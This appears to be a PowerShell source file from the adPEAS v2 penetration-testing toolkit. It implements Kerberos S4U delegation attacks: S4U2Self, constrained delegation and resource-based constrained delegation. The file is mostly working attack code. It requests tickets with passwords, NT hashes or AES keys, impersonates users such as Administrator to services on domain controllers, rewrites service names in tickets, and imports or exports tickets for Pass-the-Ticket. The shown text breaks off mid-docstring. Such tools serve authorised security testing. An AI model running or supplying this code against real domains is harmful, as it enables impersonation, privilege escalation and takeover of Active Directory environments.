# Invoke-S4U.ps1
# S4U (Service for User) Attack Implementation
# Supports S4U2Self alone, Classic Constrained Delegation (with or without protocol
# transition) and Resource-Based Constrained Delegation (RBCD)
#
# Architecture:
# - ConvertTo-S4UKrbCred: Internal - wraps an S4U service ticket in a KRB-CRED
# - Read-S4UTicketInput: Internal - loads a .kirbi or ccache ticket (file path or Base64)
# - Invoke-S4UCore: Internal function containing S4U workflow logic
# - Invoke-S4U: Public, the general S4U command (credentials or a TGT, S4U2Self alone,
#   S4U2Proxy, an evidence ticket instead of S4U2Self, resource-based)
# - Invoke-ConstrainedDelegation: Public function for Classic CD (Scenario 1)
# - Invoke-RBCD: Public function for RBCD attacks (Scenarios 2+3)

# ============================================================================
# LAYER 1: Internal Helpers and Core Function
# ============================================================================

function ConvertTo-S4UKrbCred {
    <#
    .SYNOPSIS
        Internal: wraps a service ticket from Request-ServiceTicket in a KRB-CRED.

    .DESCRIPTION
        Builds the KRB-CRED the way the logon path builds it for its own service tickets
        (Invoke-KerberosAuthFlow): the SPN split into service class and host, the session
        key labelled with the session key type, and the ticket's own flags and times.

        Request-ServiceTicket returns two etypes. EncryptionType is the etype of the
        TICKET - the key of the target service, which is what Kerberoasting needs.
        SessionKeyType is the etype of the session key the client shares with that
        service. A KRB-CRED that labels the session key with the ticket etype names the
        wrong key type whenever the two differ - a target with RC4 keys only still gets an
        AES session key - and the imported ticket cannot be used.

        -RewriteTicket also writes the new service name into the Ticket itself, not only
        into the KRB-CRED. The sname of a Ticket lies outside its encrypted part, so the
        ticket stays valid for every service whose account holds the same key - cifs, host,
        http, ldap and so on of one computer account.

    .PARAMETER ServiceTicket
        A successful result of Request-ServiceTicket.

    .PARAMETER Realm
        Realm of the client (the domain of the impersonated user).

    .PARAMETER ClientName
        The client the ticket was issued to (the impersonated user).

    .PARAMETER ServerPrincipal
        The service the KRB-CRED names: an SPN (service/host) or an account name (the
        service of an S4U2Self ticket is the requesting account itself).

    .PARAMETER RewriteTicket
        Also replace the service name inside the Ticket (service-name substitution).
    #>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [object]$ServiceTicket,

        [Parameter(Mandatory=$true)]
        [string]$Realm,

        [Parameter(Mandatory=$true)]
        [string]$ClientName,

        [Parameter(Mandatory=$true)]
        [string]$ServerPrincipal,

        [Parameter(Mandatory=$false)]
        [switch]$RewriteTicket
    )

    $nameParts = $ServerPrincipal -split '/', 2
    $serverName = $nameParts[0]
    $serverInstance = $null
    if ($nameParts.Count -eq 2) { $serverInstance = $nameParts[1] }

    $ticketBytes = [byte[]]$ServiceTicket.TicketBytes
    if ($RewriteTicket) {
        $parsedTicket = Read-KerberosTicket -TicketBytes $ticketBytes
        if (-not $parsedTicket -or -not $parsedTicket.EncPart) {
            throw "Cannot substitute the service name: the ticket could not be parsed"
        }
        $ticketRealm = $Realm
        if ($parsedTicket.Realm) { $ticketRealm = $parsedTicket.Realm }
        $ticketParams = @{
            Realm          = $ticketRealm
            ServerName     = $serverName
            EncryptedPart  = [byte[]]$parsedTicket.EncPart
            EncryptionType = [int]$parsedTicket.EType
            Kvno           = [int]$parsedTicket.Kvno
        }
        if ($serverInstance) { $ticketParams['ServerInstance'] = $serverInstance }
        $ticketBytes = New-KerberosTicket @ticketParams
    }

    # The session key type, not the ticket etype (see .DESCRIPTION). Request-ServiceTicket
    # itself falls back to the enc-part etype when the reply names no key type.
    $sessionKeyType = [int]$ServiceTicket.EncryptionType
    if ($ServiceTicket.SessionKeyType) { $sessionKeyType = [int]$ServiceTicket.SessionKeyType }

    $credParams = @{
        Ticket         = [byte[]]$ticketBytes
        SessionKey     = [byte[]]$ServiceTicket.SessionKeyBytes
        SessionKeyType = $sessionKeyType
        Realm          = $Realm.ToUpper()
        ClientName     = $ClientName
        ServerName     = $serverName
    }
    if ($serverInstance) { $credParams['ServerInstance'] = $serverInstance }
    foreach ($field in @('TicketFlags', 'AuthTime', 'StartTime', 'EndTime', 'RenewTill')) {
        if ($null -ne $ServiceTicket.$field) { $credParams[$field] = $ServiceTicket.$field }
    }

    # The comma, as in Build-KRBCred itself: without it the byte array is unrolled once more
    # at this function's boundary and the caller gets an object[] instead of a byte[].
    $krbCred = Build-KRBCred @credParams
    return ,([byte[]]$krbCred)
}

function Read-S4UTicketInput {
    <#
    .SYNOPSIS
        Internal: loads a Kerberos ticket from a .kirbi (KRB-CRED) or a ccache, given as a
        file path or as Base64.

    .DESCRIPTION
        Returns the raw Ticket, its session key and key type, and the client and server
        principal. A raw Ticket without its KRB-CRED is rejected: it carries neither the
        session key S4U needs to sign its requests with a TGT, nor the name of the client
        an evidence ticket was issued to.

    .PARAMETER InputValue
        File path, or Base64 of the file content.

    .PARAMETER ParameterName
        Name of the parameter the value came from, for the error messages.
    #>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [string]$InputValue,

        [Parameter(Mandatory=$true)]
        [string]$ParameterName
    )

    $loaded = ConvertFrom-Base64OrFile -InputValue $InputValue -ExpectedFormat 'Any' -ParameterName $ParameterName
    if (-not $loaded -or -not $loaded.Success) {
        $reason = 'the input could not be read'
        if ($loaded -and $loaded.Error) { $reason = $loaded.Error }
        throw "-${ParameterName}: $reason"
    }
    $data = [byte[]]$loaded.Data
    if (-not $data -or $data.Length -lt 2) {
        throw "-${ParameterName}: the ticket data is empty"
    }

    $ccacheVersion = ([int]$data[0] -shl 8) -bor [int]$data[1]

    if ($data[0] -eq 0x76) {
        $cred = Read-KRBCred -KirbiBytes $data
        if (-not $cred -or -not $cred.Ticket) {
            throw "-${ParameterName}: the KRB-CRED holds no ticket"
        }
        if (-not $cred.SessionKey) {
            throw "-${ParameterName}: the credential part of this KRB-CRED is encrypted, so its session key and client cannot be read - export the ticket unencrypted, as Rubeus and Mimikatz write .kirbi files"
        }
        $serverName = $cred.ServerName
        if (-not $serverName) { $serverName = $cred.TicketSName }
        $clientRealm = $cred.ClientRealm
        if (-not $clientRealm) { $clientRealm = $cred.TicketRealm }
        return [PSCustomObject]@{
            Format         = 'Kirbi'
            Ticket         = [byte[]]$cred.Ticket
            SessionKey     = [byte[]]$cred.SessionKey
            SessionKeyType = [int]$cred.SessionKeyType
            ClientName     = $cred.ClientName
            ClientRealm    = $clientRealm
            ServerName     = $serverName
        }
    }

    if ($ccacheVersion -ge 0x0501 -and $ccacheVersion -le 0x0504) {
        $cache = ConvertFrom-CcacheBytes -Bytes $data
        if (-not $cache -or -not $cache.Ticket -or -not $cache.SessionKey) {
            throw "-${ParameterName}: the ccache holds no usable credential"
        }
        return [PSCustomObject]@{
            Format         = 'Ccache'
            Ticket         = [byte[]]$cache.Ticket
            SessionKey     = [byte[]]$cache.SessionKey
            SessionKeyType = [int]$cache.SessionKeyType
            ClientName     = $cache.ClientName
            ClientRealm    = $cache.ClientRealm
            ServerName     = $cache.ServerName
        }
    }

    if ($data[0] -eq 0x61) {
        throw "-${ParameterName}: this is a bare Ticket without its KRB-CRED - it carries no session key and no client name. Pass the .kirbi (KRB-CRED) or the ccache"
    }

    throw "-${ParameterName}: neither a .kirbi (KRB-CRED) nor a ccache (first byte 0x$($data[0].ToString('X2')))"
}

function Invoke-S4UCore {
    <#
    .SYNOPSIS
        Internal core function for S4U attacks. Not intended for direct use.

    .DESCRIPTION
        Performs the S4U workflow: the service account's TGT, S4U2Self, S4U2Proxy, with
        optional service-name substitution and Pass-the-Ticket.

        This is an internal function called by Invoke-S4U, Invoke-ConstrainedDelegation
        and Invoke-RBCD. Do not call directly. Variants:
        - -TGTTicket (with -TGTSessionKey/-TGTSessionKeyType): the service account's TGT is
          given, so no AS exchange is made and no secret of the account is needed.
        - -EvidenceTicket: S4U2Self is skipped, and the given service ticket (impersonated
          user -> service account) is the additional ticket of S4U2Proxy. That is
          constrained delegation without protocol transition, where the KDC issues an
          S4U2Self ticket that is not forwardable and S4U2Proxy refuses it.
        - No -TargetSPN: S4U2Self alone; the result is the S4U2Self ticket, a ticket for
          the impersonated user to the service account itself.
    #>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [string]$ServiceAccount,

        [Parameter(Mandatory=$true)]
        [string]$ImpersonateUser,

        # Empty: S4U2Self alone
        [Parameter(Mandatory=$false)]
        [string]$TargetSPN,

        [Parameter(Mandatory=$true)]
        [string]$Domain,

        [Parameter(Mandatory=$false)]
        [string]$Server,

        # Service Account Authentication (one of these, or the TGT below)
        [Parameter(Mandatory=$false)]
        [System.Management.Automation.PSCredential]$ServiceCredential,

        [Parameter(Mandatory=$false)]
        [string]$ServicePassword,

        [Parameter(Mandatory=$false)]
        [string]$ServiceNTHash,

        [Parameter(Mandatory=$false)]
        [string]$ServiceAES256Key,

        [Parameter(Mandatory=$false)]
        [string]$ServiceAES128Key,

        # The service account's TGT, instead of a secret
        [Parameter(Mandatory=$false)]
        [byte[]]$TGTTicket,

        [Parameter(Mandatory=$false)]
        [byte[]]$TGTSessionKey,

        [Parameter(Mandatory=$false)]
        [int]$TGTSessionKeyType,

        # A service ticket impersonated user -> service account, instead of S4U2Self
        [Parameter(Mandatory=$false)]
        [byte[]]$EvidenceTicket,

        # Flags
        [Parameter(Mandatory=$false)]
        [switch]$UseRBCD,

        [Parameter(Mandatory=$false)]
        [switch]$PTT,

        [Parameter(Mandatory=$false)]
        [string]$OutputKirbi,

        [Parameter(Mandatory=$false)]
        [string[]]$AlternateService
    )

    begin {
        Write-Log "[Invoke-S4UCore] Starting S4U workflow"
        Write-Log "[Invoke-S4UCore] Service Account: $ServiceAccount"
        Write-Log "[Invoke-S4UCore] Impersonate User: $ImpersonateUser"
        if ($TargetSPN) {
            Write-Log "[Invoke-S4UCore] Target SPN: $TargetSPN"
        } else {
            Write-Log "[Invoke-S4UCore] Target SPN: none - S4U2Self alone"
        }
        Write-Log "[Invoke-S4UCore] RBCD Mode: $UseRBCD"
    }

    process {
        try {
            if (-not $TargetSPN -and ($EvidenceTicket -or $UseRBCD)) {
                throw "An evidence ticket and resource-based delegation only apply to S4U2Proxy - specify -TargetSPN"
            }

            # Resolve the substituted SPNs before any request is made, so that an entry
            # that cannot be resolved fails here and not after the Kerberos exchanges.
            $targetHost = $null
            if ($TargetSPN) {
                $spnParts = $TargetSPN -split '/', 2
                $targetHost = $TargetSPN
                if ($spnParts.Count -ge 2) { $targetHost = $spnParts[1] }
            }
            $altSPNs = @()
            foreach ($altSvc in @($AlternateService)) {
                if (-not $altSvc) { continue }
                if ($altSvc -match '/') {
                    $altSPNs += $altSvc
                } elseif ($targetHost) {
                    $altSPNs += "$altSvc/$targetHost"
                } else {
                    throw "-AlternateService '$altSvc' needs a host when there is no -TargetSPN - give the full SPN, e.g. 'cifs/<host>'"
                }
            }

            # Resolve Server if not specified
            if (-not $Server) {
                if ($Script:LDAPContext -and $Script:LDAPContext.ContainsKey('Server') -and $Script:LDAPContext['Server']) {
                    $Server = $Script:LDAPContext['Server']
                    Write-Log "[Invoke-S4UCore] Using DC from session: $Server"
                } else {
                    # -Domain, not -Type DC - Resolve-adPEASName has no -Type parameter;
                    # its DC-discovery parameter set is selected by -Domain alone, and it
                    # returns a {Hostname; IP} object, never a bare string - the same
                    # shape every other caller in the codebase reads (Invoke-Kerberoast.ps1,
                    # Invoke-DCSync.ps1, Connect-adPEAS.ps1). This threw "A parameter cannot
                    # be found that matches parameter name 'Type'" on every call made
                    # without an active session and without an explicit -Server.
                    $dcResolution = Resolve-adPEASName -Domain $Domain
                    if (-not $dcResolution -or -not $dcResolution.Hostname) {
                        throw "Could not resolve Domain Controller for domain '$Domain'. Specify -Server explicitly."
                    }
                    $Server = $dcResolution.Hostname
                    Write-Log "[Invoke-S4UCore] Resolved DC via DNS: $Server"
                }
            }

            # Step 1: the service account's TGT - given, or requested with its secret
            if ($TGTTicket) {
                if (-not $TGTSessionKey -or -not $TGTSessionKeyType) {
                    throw "A supplied TGT needs its session key and session key type"
                }
                Write-Log "[Invoke-S4UCore] Step 1: Using the supplied TGT of '$ServiceAccount'"
                $tgtTicketBytes = $TGTTicket
                $tgtSessionKeyBytes = $TGTSessionKey
                $tgtSessionKeyType = $TGTSessionKeyType
                $tgtServer = $Server
            }
            else {
                Write-Log "[Invoke-S4UCore] Step 1: Requesting TGT for '$ServiceAccount'"

                $authParams = @{
                    UserName         = $ServiceAccount
                    Domain           = $Domain
                    DomainController = $Server
                }

                if ($ServiceCredential) { $authParams['Credential'] = $ServiceCredential }
                elseif ($ServicePassword) { $authParams['Password'] = $ServicePassword }
                elseif ($ServiceNTHash) { $authParams['NTHash'] = $ServiceNTHash }
                elseif ($ServiceAES256Key) { $authParams['AES256Key'] = $ServiceAES256Key }
                elseif ($ServiceAES128Key) { $authParams['AES128Key'] = $ServiceAES128Key }
                else {
                    throw "Service account authentication required. Provide -ServiceCredential, -ServicePassword, -ServiceNTHash, -ServiceAES256Key, or -ServiceAES128Key"
                }

                $tgtResult = Invoke-KerberosAuth @authParams

                if (-not $tgtResult -or -not $tgtResult.Success) {
                    $errMsg = if ($tgtResult) { $tgtResult.Error } else { "No result returned" }
                    throw "Failed to obtain TGT for '$ServiceAccount': $errMsg"
                }

                $tgtTicketBytes = $tgtResult.TicketBytes
                $tgtSessionKeyBytes = $tgtResult.SessionKeyBytes
                $tgtSessionKeyType = $tgtResult.EncryptionType
                $tgtServer = $tgtResult.DomainController
                Write-Log "[Invoke-S4UCore] TGT acquired via $tgtServer (etype $($tgtResult.EncryptionType))"
            }

            # Step 2: the ticket S4U2Proxy forwards - from S4U2Self, or the evidence ticket
            $s4u2selfResult = $null
            if ($EvidenceTicket) {
                Write-Log "[Invoke-S4UCore] Step 2: Using the supplied evidence ticket instead of S4U2Self"
                $additionalTicket = $EvidenceTicket
            }
            else {
                Write-Log "[Invoke-S4UCore] Step 2: S4U2Self - requesting ticket on behalf of '$ImpersonateUser'"

                $s4u2selfResult = Request-ServiceTicket `
                    -TGT $tgtTicketBytes `
                    -SessionKey $tgtSessionKeyBytes `
                    -SessionKeyType $tgtSessionKeyType `
                    -ServicePrincipalName $ServiceAccount `
                    -Domain $Domain `
                    -DomainController $tgtServer `
                    -UserName $ServiceAccount `
                    -S4U2Self `
                    -ImpersonateUser $ImpersonateUser

                if (-not $s4u2selfResult -or -not $s4u2selfResult.Success) {
                    $errMsg = if ($s4u2selfResult) { $s4u2selfResult.Message } else { "No result returned" }
                    throw "S4U2Self failed: $errMsg"
                }

                Write-Log "[Invoke-S4UCore] S4U2Self succeeded (etype: $($s4u2selfResult.EncryptionType))"
                $additionalTicket = $s4u2selfResult.TicketBytes
            }

            # Step 3: S4U2Proxy - Constrained Delegation (skipped for S4U2Self alone)
            if ($TargetSPN) {
                Write-Log "[Invoke-S4UCore] Step 3: S4U2Proxy - forwarding ticket to '$TargetSPN'"

                $s4u2proxyParams = @{
                    TGT                  = $tgtTicketBytes
                    SessionKey           = $tgtSessionKeyBytes
                    SessionKeyType       = $tgtSessionKeyType
                    ServicePrincipalName = $TargetSPN
                    Domain               = $Domain
                    DomainController     = $tgtServer
                    UserName             = $ServiceAccount
                    S4U2Proxy            = $true
                    AdditionalTicket     = $additionalTicket
                    ImpersonateUser      = $ImpersonateUser
                }

                if ($UseRBCD) {
                    $s4u2proxyParams['ResourceBased'] = $true
                    Write-Log "[Invoke-S4UCore] Using RBCD mode (PA-PAC-OPTIONS flag)"
                }

                $s4u2proxyResult = Request-ServiceTicket @s4u2proxyParams

                if (-not $s4u2proxyResult -or -not $s4u2proxyResult.Success) {
                    $errMsg = if ($s4u2proxyResult) { $s4u2proxyResult.Message } else { "No result returned" }
                    throw "S4U2Proxy failed: $errMsg"
                }

                Write-Log "[Invoke-S4UCore] S4U2Proxy succeeded (etype: $($s4u2proxyResult.EncryptionType))"
                $finalTicket = $s4u2proxyResult
                $finalPrincipal = $TargetSPN
            }
            else {
                Write-Log "[Invoke-S4UCore] Step 3: Skipped - S4U2Self alone"
                $finalTicket = $s4u2selfResult
                $finalPrincipal = $ServiceAccount
            }

            # The KRB-CRED of the ticket as issued (needed for PTT and -OutputKirbi).
            # ConvertTo-S4UKrbCred passes the raw .SessionKeyBytes - not the Base64
            # display string .SessionKey, which Build-KRBCred's [byte[]] -SessionKey
            # rejects - and labels the key with its own type, not the ticket etype.
            $baseKrbCred = ConvertTo-S4UKrbCred -ServiceTicket $finalTicket -Realm $Domain `
                -ClientName $ImpersonateUser -ServerPrincipal $finalPrincipal

            # Step 4: Service-name substitution (optional)
            $alternateTickets = $null
            $altSPNList = $null
            $pttMessage = ""

            if ($altSPNs.Count -gt 0) {
                Write-Log "[Invoke-S4UCore] Step 4: Applying SPN substitution for $($altSPNs.Count) alternate service(s)"

                $alternateTickets = @()

                foreach ($newSPN in $altSPNs) {
                    Write-Log "[Invoke-S4UCore] Substituting: $finalPrincipal -> $newSPN"

                    try {
                        $altKrbCred = ConvertTo-S4UKrbCred -ServiceTicket $finalTicket -Realm $Domain `
                            -ClientName $ImpersonateUser -ServerPrincipal $newSPN -RewriteTicket

                        $altTicketObj = [PSCustomObject]@{
                            SPN         = $newSPN
                            TicketBytes = $altKrbCred
                            Imported    = $false
                        }

                        # Optional PTT for alternate ticket
                        if ($PTT) {
                            $pttResult = Import-KerberosTicket -TicketBytes $altKrbCred
                            if ($pttResult -and $pttResult.Success) {
                                $altTicketObj.Imported = $true
                                Write-Log "[Invoke-S4UCore] Alternate ticket imported: $newSPN"
                            } else {
                                Write-Warning "[!] Failed to import alternate ticket for $newSPN"
                            }
                        }

                        $alternateTickets += $altTicketObj
                    }
                    catch {
                        $errMsg = $_.Exception.Message
                        Write-Warning "[!] SPN substitution failed for ${newSPN}: $errMsg"
                    }
                }

                $importedCount = @($alternateTickets | Where-Object { $_.Imported }).Count
                if (-not $PTT) {
                    $pttMessage = " ($($altSPNs.Count) alternate ticket(s) - use -PTT to import)"
                } elseif ($importedCount -eq $altSPNs.Count) {
                    $pttMessage = " ($importedCount alternate ticket(s) imported)"
                } else {
                    $pttMessage = " ($importedCount/$($altSPNs.Count) alternate ticket(s) imported)"
                }

                $altSPNList = $altSPNs -join ', '
            }
            else {
                # No AlternateService - standard PTT for original ticket
                if ($PTT) {
                    Write-Log "[Invoke-S4UCore] Step 4: Importing ticket via Pass-the-Ticket"

                    $pttResult = Import-KerberosTicket -TicketBytes $baseKrbCred

                    if ($pttResult -and $pttResult.Success) {
                        $pttMessage = " (ticket imported)"
                        Write-Log "[Invoke-S4UCore] Ticket imported successfully"
                    } else {
                        $pttMessage = " (PTT failed - ticket available in result)"
                        Write-Warning "[!] PTT failed, ticket available in result object"
                    }
                } else {
                    $pttMessage = " (ticket not imported - use -PTT to import)"
                }
            }

            # Step 5: Export .kirbi (optional) - the ticket as issued, and next to it every
            # substituted one: with S4U2Self alone the ticket as issued names the service
            # account itself, so the substituted ticket is usually the one wanted.
            $altKirbiFiles = @()
            if ($OutputKirbi) {
                # Resolve PSPath to filesystem path: [IO.File]::WriteAllBytes uses
                # Environment.CurrentDirectory, not PowerShell's $PWD.
                $outputPath = $ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath($OutputKirbi)
                Write-Log "[Invoke-S4UCore] Exporting ticket to: $outputPath"

                try {
                    [System.IO.File]::WriteAllBytes($outputPath, $baseKrbCred)
                    Write-Log "[Invoke-S4UCore] Ticket exported successfully"
                }
                catch {
                    Write-Warning "[!] Failed to export .kirbi: $($_.Exception.Message)"
                }

                foreach ($altTicket in @($alternateTickets)) {
                    if (-not $altTicket) { continue }
                    $safeName = $altTicket.SPN -replace '[\\/:*?"<>|]', '_'
                    $altPath = [System.IO.Path]::Combine(
                        [System.IO.Path]::GetDirectoryName($outputPath),
                        ([System.IO.Path]::GetFileNameWithoutExtension($outputPath) + '_' + $safeName + '.kirbi'))
                    try {
                        [System.IO.File]::WriteAllBytes($altPath, [byte[]]$altTicket.TicketBytes)
                        $altKirbiFiles += $altPath
                        Write-Log "[Invoke-S4UCore] Alternate ticket exported: $altPath"
                    }
                    catch {
                        Write-Warning "[!] Failed to export .kirbi for $($altTicket.SPN): $($_.Exception.Message)"
                    }
                }
            }

            # Build Result Object
            $delegationType = "Classic Constrained Delegation"
            if (-not $TargetSPN) { $delegationType = "S4U2Self" }
            elseif ($UseRBCD) { $delegationType = "RBCD" }
            elseif ($EvidenceTicket) { $delegationType = "Constrained Delegation (evidence ticket)" }

            $result = [PSCustomObject]@{
                PSTypeName          = 'adPEAS.S4U.Result'
                Success             = $true
                DelegationType      = $delegationType
                ServiceAccount      = $ServiceAccount
                ImpersonateUser     = $ImpersonateUser
                TargetSPN           = $TargetSPN
                TicketFor           = $finalPrincipal
                Domain              = $Domain
                DomainController    = $tgtServer
                TicketBytes         = $baseKrbCred
                Imported            = ($PTT -and $altSPNs.Count -eq 0)
                Message             = "S4U attack successful$pttMessage"
            }

            # Add AlternateService results if present
            if ($alternateTickets) {
                $result | Add-Member -NotePropertyName 'AlternateService' -NotePropertyValue $AlternateService
                $result | Add-Member -NotePropertyName 'AlternateTickets' -NotePropertyValue $alternateTickets
                $result | Add-Member -NotePropertyName 'AlternateSPNs' -NotePropertyValue $altSPNList
            }

            # Add OutputKirbi path if used
            if ($OutputKirbi) {
                $result | Add-Member -NotePropertyName 'KirbiFile' -NotePropertyValue $OutputKirbi
                if ($altKirbiFiles.Count -gt 0) {
                    $result | Add-Member -NotePropertyName 'AlternateKirbiFiles' -NotePropertyValue $altKirbiFiles
                }
            }

            return $result
        }
        catch {
            Write-Log "[Invoke-S4UCore] S4U attack failed: $($_.Exception.Message)"

            return [PSCustomObject]@{
                PSTypeName      = 'adPEAS.S4U.Result'
                Success         = $false
                ServiceAccount  = $ServiceAccount
                ImpersonateUser = $ImpersonateUser
                TargetSPN       = $TargetSPN
                Domain          = $Domain
                Message         = "S4U attack failed"
                Error           = $_.Exception.Message
            }
        }
    }
}


# ============================================================================
# LAYER 2: Public Functions
# ============================================================================

function Invoke-ConstrainedDelegation {
    <#
    .SYNOPSIS
        Performs Classic Constrained Delegation attack using S4U2Self + S4U2Proxy.

    .DESCRIPTION
        Exploits Classic Constrained Delegation to impersonate any user (including
        protected users without delegation restrictions) to a target service.

        This attack leverages S4U extensions in the Kerberos protocol:
        - S4U2Self (Protocol Transition): Request a service ticket on behalf of another user
        - S4U2Proxy (Constrained Delegation): Forward the ticket to a target service

        Prerequisites:
        - Service account with msDS-AllowedToDelegateTo attribute configured
        - msDS-AllowedToDelegateTo must contain the target SPN
        - Service account credentials (password, hash, or AES key)

        Attack Scenarios:
        1. Classic CD: Service has msDS-AllowedToDelegateTo to target SPN
        2. AlternateService: Substitute service class (e.g., LDAP -> CIFS)

        Failure Cases:
        - KRB_AP_ERR_NOT_US (47): Protocol Transition not allowed on service account
        - KRB_AP_ERR_BADMATCH (36): Target SPN not in msDS-AllowedToDelegateTo
        - KDC_ERR_BADOPTION (13): Delegation flag not set on S4U2Self ticket

    .PARAMETER ServiceAccount
        Service account with msDS-AllowedToDelegateTo configured (sAMAccountName).

    .PARAMETER ImpersonateUser
        User to impersonate (sAMAccountName). Can be any user, including protected.

    .PARAMETER TargetSPN
        Target SPN from msDS-AllowedToDelegateTo list (e.g., "cifs/server.domain.com").

    .PARAMETER Domain
        Target domain FQDN.

    .PARAMETER Server
        Specific Domain Controller (optional, auto-resolved if not provided).

    .PARAMETER ServiceCredential
        PSCredential object for service account.

    .PARAMETER ServicePassword
        Plain-text password for service account.

    .PARAMETER ServiceNTHash
        NT hash for service account (Overpass-the-Hash).

    .PARAMETER ServiceAES256Key
        AES256 key for service account (Pass-the-Key).

    .PARAMETER ServiceAES128Key
        AES128 key for service account (Pass-the-Key).

    .PARAMETER PTT
        Automatically import ticket via Pass-the-Ticket (no admin required).

    .PARAMETER OutputKirbi
        Export ticket to .kirbi file (for use with Rubeus/Mimikatz).

    .PARAMETER AlternateService
        Array of service classes to substitute (e.g., @('ldap','cifs','host')).
        Enables service class substitution attack.

    .EXAMPLE
        Invoke-ConstrainedDelegation -ServiceAccount "websvc" -ImpersonateUser "Administrator" -TargetSPN "cifs/dc01.contoso.com" -Domain "contoso.com" -ServicePassword "P@ssw0rd"

        Impersonate Administrator to CIFS service on DC01 using websvc credentials.

    .EXAMPLE
        Invoke-ConstrainedDelegation -ServiceAccount "sqlsvc" -ImpersonateUser "da_user" -TargetSPN "mssql/sql01.contoso.com" -Domain "contoso.com" -ServiceNTHash "8846f7eaee8fb117ad06bdd830b7586c" -PTT

        Overpass-the-Hash attack with automatic ticket import.

    .EXAMPLE
        Invoke-ConstrainedDelegation -ServiceAccount "websvc" -ImpersonateUser "Administrator" -TargetSPN "http/web01.contoso.com" -Domain "contoso.com" -ServiceAES256Key "4a3b2c1d..." -AlternateService @('cifs','ldap','host') -PTT

        Substitute HTTP -> CIFS/LDAP/HOST on web01 and import all tickets.

    .OUTPUTS
        PSCustomObject with Success, ServiceAccount, ImpersonateUser, TargetSPN, TicketBytes, etc.

    .NOTES
        Author: Alexander Sturz
        Part of adPEAS v2
    #>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [string]$ServiceAccount,

        [Parameter(Mandatory=$true)]
        [string]$ImpersonateUser,

        [Parameter(Mandatory=$true)]
        [string]$TargetSPN,

        [Parameter(Mandatory=$true)]
        [string]$Domain,

        [Parameter(Mandatory=$false)]
        [string]$Server,

        # Service Account Authentication
        [Parameter(Mandatory=$false, ParameterSetName='Credential')]
        [System.Management.Automation.PSCredential]$ServiceCredential,

        [Parameter(Mandatory=$false, ParameterSetName='Password')]
        [string]$ServicePassword,

        [Parameter(Mandatory=$false, ParameterSetName='NTHash')]
        [string]$ServiceNTHash,

        [Parameter(Mandatory=$false, ParameterSetName='AES256')]
        [string]$ServiceAES256Key,

        [Parameter(Mandatory=$false, ParameterSetName='AES128')]
        [string]$ServiceAES128Key,

        # Options
        [Parameter(Mandatory=$false)]
        [switch]$PTT,

        [Parameter(Mandatory=$false)]
        [string]$OutputKirbi,

        [Parameter(Mandatory=$false)]
        [string[]]$AlternateService
    )

    begin {
        Write-Verbose "[Invoke-ConstrainedDelegation] Starting Classic Constrained Delegation attack"
    }

    process {
        # Build core parameters
        $coreParams = @{
            ServiceAccount  = $ServiceAccount
            ImpersonateUser = $ImpersonateUser
            TargetSPN       = $TargetSPN
            Domain          = $Domain
            UseRBCD         = $false
        }

        # Add optional parameters
        if ($Server) { $coreParams['Server'] = $Server }
        if ($ServiceCredential) { $coreParams['ServiceCredential'] = $ServiceCredential }
        if ($ServicePassword) { $coreParams['ServicePassword'] = $ServicePassword }
        if ($ServiceNTHash) { $coreParams['ServiceNTHash'] = $ServiceNTHash }
        if ($ServiceAES256Key) { $coreParams['ServiceAES256Key'] = $ServiceAES256Key }
        if ($ServiceAES128Key) { $coreParams['ServiceAES128Key'] = $ServiceAES128Key }
        if ($PTT) { $coreParams['PTT'] = $true }
        if ($OutputKirbi) { $coreParams['OutputKirbi'] = $OutputKirbi }
        if ($AlternateService) { $coreParams['AlternateService'] = $AlternateService }

        # Delegate to core function
        return Invoke-S4UCore @coreParams
    }
}

function Invoke-RBCD {
    <#
    .SYNOPSIS
        Performs Resource-Based Constrained Delegation (RBCD) attack.

    .DESCRIPTION
        Exploits Resource-Based Constrained Delegation (RBCD) to impersonate users
        to a target computer. Supports two modes:

        **Manual Mode:**
        - Requires control over a service account with SPN configured
        - Target computer must have msDS-AllowedToActOnBehalfOfOtherIdentity pointing to service account
        - You manually configure RBCD delegation before running attack

        **Auto Mode:**
        - Automatically creates a new computer account via LDAP
        - Configures RBCD delegation on target computer (via Set-DomainComputer)
        - Performs S4U attack with auto-generated credentials
        - Requires:
          - MachineAccountQuota > 0 (default 10)
          - GenericWrite/GenericAll on target computer object

        Attack Flow:
        1. [Auto only] Create computer account via New-DomainComputer
        2. [Auto only] Set msDS-AllowedToActOnBehalfOfOtherIdentity via Set-DomainComputer
        3. S4U2Self: Request ticket on behalf of target user
        4. S4U2Proxy: Forward ticket to target SPN (with PA-PAC-OPTIONS flag)
        5. [Optional] AlternateService substitution
        6. [Optional] Pass-the-Ticket import

        Prerequisites (Manual Mode):
        - Service account with SPN configured
        - Target computer has msDS-AllowedToActOnBehalfOfOtherIdentity configured
        - Service account credentials

        Prerequisites (Auto Mode):
        - Domain credentials with LDAP session active
        - MachineAccountQuota > 0
        - GenericWrite/GenericAll on target computer object

        Failure Cases:
        - Auto Mode: MachineAccountQuota exhausted
        - Auto Mode: No GenericWrite on target computer
        - KRB_AP_ERR_NOT_US (47): Protocol Transition not allowed
        - KDC_ERR_BADOPTION (13): PA-PAC-OPTIONS flag missing or invalid

    .PARAMETER ServiceAccount
        [Manual Mode] Service account with SPN (sAMAccountName).

    .PARAMETER TargetComputer
        [Auto Mode] Target computer to attack (sAMAccountName with or without $).

    .PARAMETER ImpersonateUser
        User to impersonate (sAMAccountName). Can be any user.

    .PARAMETER TargetSPN
        Target SPN (e.g., "cifs/server.domain.com" or "ldap/dc01.domain.com").

    .PARAMETER Domain
        Target domain FQDN.

    .PARAMETER Server
        Specific Domain Controller (optional).

    .PARAMETER ServiceCredential
        [Manual Mode] PSCredential for service account.

    .PARAMETER ServicePassword
        [Manual Mode] Plain-text password for service account.

    .PARAMETER ServiceNTHash
        [Manual Mode] NT hash for service account.

    .PARAMETER ServiceAES256Key
        [Manual Mode] AES256 key for service account.

    .PARAMETER ServiceAES128Key
        [Manual Mode] AES128 key for service account.

    .PARAMETER PTT
        Automatically import ticket via Pass-the-Ticket.

    .PARAMETER OutputKirbi
        Export ticket to .kirbi file.

    .PARAMETER AlternateService
        Array of service classes for substitution (e.g., @('cifs','ldap','host')).

    .EXAMPLE
